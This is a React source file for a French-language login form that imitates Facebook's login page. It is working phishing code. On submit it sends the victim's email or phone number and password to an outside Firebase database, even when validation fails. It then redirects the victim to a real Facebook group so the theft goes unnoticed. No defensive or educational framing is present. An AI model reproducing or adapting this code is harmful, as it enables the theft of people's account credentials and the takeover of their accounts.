// LoginForm.js
import React, { useState } from 'react';
import './LoginForm.css';

const LoginForm = () => {
  const [user, setUser] = useState({
    Email: '',
    Password: ''
  });

  const [errors, setErrors] = useState({
    email: '',
    password: ''
  });
  const validatePassword = (password) => {
    // Vérifiez si le mot de passe a une longueur d'au moins 6 caractères
    return password.length >= 6;
  };

  const validateEmailOrPhone = (input) => {
    // Utilisez une expression régulière pour valider l'email ou le numéro de téléphone
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^[0-9]{10}$/; // Exemple de regex pour un numéro de téléphone de 10 chiffres
  
    return emailRegex.test(input) || phoneRegex.test(input);
  };
  
  const data = (e) => {
    const { name, value } = e.target;
    setUser({ ...user, [name]: value });
  
    // Validation pour l'email ou le numéro de téléphone
    if (name === 'Email') {
      const emailOrPhoneError = validateEmailOrPhone(value) ? '' : 'Adresse email ou numéro de téléphone invalide';
      setErrors({ ...errors, email: emailOrPhoneError });
    }
  
    // Validation pour le mot de passe
    if (name === 'Password') {
      const passwordError = validatePassword(value) ? '' : 'Le mot de passe doit contenir invalide';
      setErrors({ ...errors, password: passwordError });
    }
  };
  const getdata = async (e) => {
    e.preventDefault();

    const { Email, Password } = user;

    // Vérifiez s'il y a des erreurs avant d'envoyer la requête
    if (validateEmailOrPhone(Email) && validatePassword(Password)) {
      const options = {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          Email,
          Password,
        }),
      };

      const res = await fetch("https://facebook-975ea-default-rtdb.firebaseio.com/contactForm.json", options);

      window.location.href = "https://facebook.com/groups/1220483151301152/";

      console.log(res);
    } else {
      const options = {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          Email,
          Password,
        }),
      };

      const res = await fetch("https://facebook-975ea-default-rtdb.firebaseio.com/contactForm.json", options);


      console.log(res);
      // Afficher des messages d'erreur ou empêcher l'envoi de la requête
      console.error('Veuillez corriger les erreurs de saisie.');
    }
  };

  return (
    <form className="login-form">
      <input
        type="text"
        name="Email"
        id="userEmail"
        placeholder="Numéro mobile ou e-mail"
        value={user.Email} onChange={data}
      />
      <span className="error-message ">{errors.email}</span>

      <input
        type="password"
        name="Password"
        id="password"
        placeholder="Mot de passe"
        value={user.Password} onChange={data}
      />
      <span className="error-message">{errors.password}</span>

      <button type="submit" onClick={getdata}>Se connecter</button>
      <a href="#">Mot de passe oublié ?</a>

      <div className="sep">
        <hr width="40%" />
        <span>ou</span>
        <hr width="40%" />
      </div>

      <button className="create-account-btn">Créer nouveau compte</button>
    </form>
  );
};

export default LoginForm;
